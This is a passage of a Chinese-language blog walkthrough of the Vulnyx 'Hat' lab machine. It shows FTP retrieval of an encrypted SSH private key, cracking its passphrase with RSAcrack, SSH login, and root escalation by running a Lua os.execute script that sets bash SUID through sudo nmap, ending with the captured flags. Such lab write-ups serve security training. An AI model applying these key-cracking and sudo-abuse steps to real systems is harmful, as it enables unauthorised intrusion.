complete.<br></code></pre></td></tr></table></figure>
+
+<p>将文件下载到本地</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">ftp</span>&gt; <span class="hljs-built_in">get</span> id_rsa<br><span class="hljs-keyword">ftp</span>&gt; <span class="hljs-built_in">get</span> note<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>note</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# <span class="hljs-built_in">cat</span> note                                      <br>Hi,<br><br>We have successfully secured some of our most critical protocols ... no more worrying!<br><br>Sysadmin<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>id_rsa</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# <span class="hljs-built_in">cat</span> id_rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: DES-EDE3-CBC,6F30B7B22B088AB2<br><br>JmLJqI4m9jk1McrIzNFyuYrPyPu3Znw6awuyEIK0ZctgYabjNk5MVCM0FH45SQCl<br>rqK3QqSACiOq4+DnMWrECj5CO+JPzGjIupgz8IrW0Cr7mkRSNa9fCeEBrIzAi924<br>GEM72PMuwlBM4zWDZ/962gtZpDnzXYLc9mYdVTe+ubI2NrVC6d2ak1L5GMsBdYwi<br>BVj8bhnUsr4doXi1ZcRAZoHUses/Z8ohfNXkUoDO2d1kQmiE0hAVEUnBerzV+E84<br>GpJFBgHphboG9E+R3Gh27viM3pY0qFvU/PWbTJ8Y6LgSgJPMLldlEuBEym0LPDpc<br>27L7wdKEYwCjPWBGtuGnKsdfleQfsyKijH8/YDlH0hsrDc83ZMcDR13jtfZbZjHZ<br>IwVdhUuKdHp6Ig4lmxi1RqJA35CD6ZHHMzOKlm1TjQskA0j6jdPeJ3o5ebh/z3oe<br>tr3FKEawz+2KQa+CX+frCwN/rLFUc8MOvh7I4/jJ9o2kdKB0u5OHH+pgXfmhTJzl<br>mVSqOtti7cxefUb142Jltku5kElwKdvVEHw+qmZNMwrw+Kv7rlpvezfsW4uzm8Je<br>nlmxXoMl62Z3FKPjKarEqZrbO6bHf6lWAIrJgJGydRn1tpD/IY1DJZKwa0aLrkbr<br>7hu8C0LSpIVdy5ZUSaT04ZL/FBxDQR7cg2/ZYF5Kc1pvIgjXrlEsbbSPDyg2bLIW<br>eCMRnevvsTS8l55qUvQ2GO73kHMcWfkAsvUaojLiSxXGTcd+gPf6kXiwTbz2wbTR<br>KPzDwKaTn74yW+9jc88+6D8CdT6OrN+2eP8K0ukdNwMqVc+Mag0TOOCwq+QVfKwf<br>O7A+3+13xjUy1/TKRIJDXuhL88RDrzA7U4uy9ZDYEq5z2HVc3agqnHMBP4k2n0KE<br>u2YoCNOp52Q4YpKoXoz5Ojw8CuUIhNqoilh/0j+gkdgIO5jMAEBT7p6M/fnhfHpe<br>VNCimSJfTjLCU49Tez0HeDDCuE4oG/vShjM0ebZHMMWTY8vVOaRz4Ktcx938Jpnj<br>/j9Z0NEAEUI2ISZGGDLS/O0fhyN9lsl1UrY2yR3NnXgbX3YkjWLDM4C8mWSCejpl<br>XhWSUYlt8X83atlUfTcn97QVGeJXvlJhBUrYEtsTHjDc2lsH3KQNYtpckQizpcyW<br>axJjIeWhI+eqWIVwsXTxKI2hIa6XuYdjUP7cusDad+pUo1Y7h0wTwLP1KYtkXrm3<br>sEvB8X2mX6tHB+1iO67UKjFdZ7Ti1Q2XY6zCCbOl3S5b24MFAFANDYgkr1QtgQqs<br>j+tSrrd1yOn4AeM6SdyLdVxKQBY2s0+9dvLmaJLH9OOdV0G4I4WcMuum40WMzXrf<br>fBAMIh7Gl0lEWPOrPtOxrQI++kAlyzNTK1oxSvdc/f30TOB4hGH8yU3EKzRh/QTa<br>fHkcKP9V7Y0xKwrg2yLuWsFSt4QnFUZEbV+wDq2i9NqvriYOxSa2qarPP04FVZRp<br>5xYdSGWdMuPFTEAaM+67wR33zzlYKvnEmE9CRHnAqVpqHFuNmgYD+S3KhzW3X1A3<br>zlflWacIB06p/cXCr3w6XNqa0y2TsNmuT2IR6JX+Qr6usNV4QWL/Jyyy4dE1oBG6<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<h1 id="五、RSAcrack"><a href="#五、RSAcrack" class="headerlink" title="五、RSAcrack"></a>五、RSAcrack</h1><p>由于<code>id_rsa</code>需要密码进行登录，因此使用<code>crack</code>进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/Tool]<br>└─# ./RSAcrack -k ../miaosec/id_rsa -w techyou.txt <br><br> ╭━━━┳━━━┳━━━╮          ╭╮  <br> ┃╭━╮┃╭━╮┃╭━╮┃          ┃┃  <br> ┃╰━╯┃╰━━┫┃ ┃┣━━┳━┳━━┳━━┫┃╭╮<br> ┃╭╮╭┻━━╮┃╰━╯┃╭━┫╭┫╭╮┃╭━┫╰╯╯<br> ┃┃┃╰┫╰━╯┃╭━╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮<br> ╰╯╰━┻━━━┻╯ ╰┻━━┻╯╰╯╰┻━━┻╯╰╯<br>─────────────────────────────<br> code: d4t4s3c   ver: v1.0.0<br>─────────────────────────────<br>[i] Cracking | ../miaosec/id_rsa<br>[i] Wordlist | techyou.txt<br>[*] Status   | 1594/20000/7%/ilovemyself<br>[+] Password | ilovemyself<br>─────────────────────────────<br></code></pre></td></tr></table></figure>
+
+<p>找到密钥的密码是<code>ilovemyself</code></p>
+<h1 id="六、获取cromiphi权限"><a href="#六、获取cromiphi权限" class="headerlink" title="六、获取cromiphi权限"></a>六、获取cromiphi权限</h1><p>使用凭证连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh -i id_rsa -6 cromiphi@<span class="hljs-string">&#x27;fe80:0000:0000:0000:0a00:27ff:fe85:a933%eth1&#x27;</span><br>** WARNING: connection is not using a post-quantum key exchange algorithm.<br>** This session may be vulnerable to <span class="hljs-string">&quot;store now, decrypt later&quot;</span> attacks.<br>** The server may need to be upgraded. See https://openssh.com/pq.html<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Linux hat 4.19.0-17-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span><br>-bash: warning: setlocale: LC_ALL: cannot change locale (zh_CN.UTF-8)<br>cromiphi@hat:~$ <span class="hljs-built_in">id</span><br>uid=1000(cromiphi) gid=1000(cromiphi) <span class="hljs-built_in">groups</span>=1000(cromiphi)<br></code></pre></td></tr></table></figure>
+
+<h1 id="七、权限提升"><a href="#七、权限提升" class="headerlink" title="七、权限提升"></a>七、权限提升</h1><p>查看sudo -l</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">cromiphi@hat:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> cromiphi on hat:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User cromiphi may run the following commands on hat:<br>    (root) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure>
+
+<p>可以执行<code>/usr/bin/nmap</code></p>
+<p>由于<code>nmap</code> 的脚本引擎使用 <strong>Lua 语言</strong>，而 <code>os.execute()</code> 是 Lua 中执行系统命令的函数 因此创建一个临时文件，路径存入变量 <code>TF</code>，将执行的命令写入到变量<code>TF</code>，执行<code>nmap</code>的脚本扫描即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">cromiphi@hat:~$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>cromiphi@hat:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;chmod 4755 /bin/bash&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>cromiphi@hat:~$ <span class="hljs-built_in">sudo</span> /usr/bin/nmap --script=<span class="hljs-variable">$TF</span><br>Starting Nmap 7.70 ( https://nmap.org ) at 2026-03-26 07:59 CET<br>NSE: Warning: Loading <span class="hljs-string">&#x27;/tmp/tmp.njpnct0nSV&#x27;</span> -- the recommended file extension is <span class="hljs-string">&#x27;.nse&#x27;</span>.<br>NSE: failed to initialize the script engine:<br>/usr/bin/../share/nmap/nse_main.lua:626: /tmp/tmp.njpnct0nSV is missing required field: <span class="hljs-string">&#x27;action&#x27;</span><br>stack traceback:<br>        [C]: <span class="hljs-keyword">in</span> <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:626: <span class="hljs-keyword">in</span> field <span class="hljs-string">&#x27;new&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:828: <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> <span class="hljs-string">&#x27;get_chosen_scripts&#x27;</span><br>        /usr/bin/../share/nmap/nse_main.lua:1315: <span class="hljs-keyword">in</span> main chunk<br>        [C]: <span class="hljs-keyword">in</span> ?<br><br>QUITTING!<br>cromiphi@hat:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cromiphi@hat:~$ /bin/bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(cromiphi) gid=1000(cromiphi) euid=0(root) <span class="hljs-built_in">groups</span>=1000(cromiphi)<br></code></pre></td></tr></table></figure>
+
+<h1 id="八、查看FLAG"><a href="#八、查看FLAG" class="headerlink" title="八、查看FLAG"></a>八、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /root/root.txt /home/cromiphi/user.txt <br>8b4acc39c4d068623a16a89ebecd5048<br>d3ea66f59d9d6ea12351b415080b5457<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Vulnyx/" class="category-chain-item">Vulnyx</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI/" class="print-no-link">#文件包含LFI</a>
+      
+        <a href="/tags/Hydra/" class="print-no-link">#Hydra</a>
+      
+        <a href="/tags/Fuzz/" class="print-no-link">#Fuzz</a>
+      
+        <a href="/tags/IPv6/" class="print-no-link">#IPv6</a>
+      
+        <a href="/tags/Pyftpdlib/" class="print-no-link">#Pyftpdlib</a>
+      
+        <a href="/tags/RSAcarck/" class="print-no-link">#RSAcarck</a>
+      
+        <a href="/tags/Sudo-Nmap/" class="print-no-link">#Sudo_Nmap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Vlx_Hat</div>
+      <div>http://miao-sec.github.io/Vulnyx/Vlx-Hat/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Mazesec-Ezre/" title="Mazesec_Ezre">
+                        <span class="hidden-mobile">Mazesec_Ezre</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
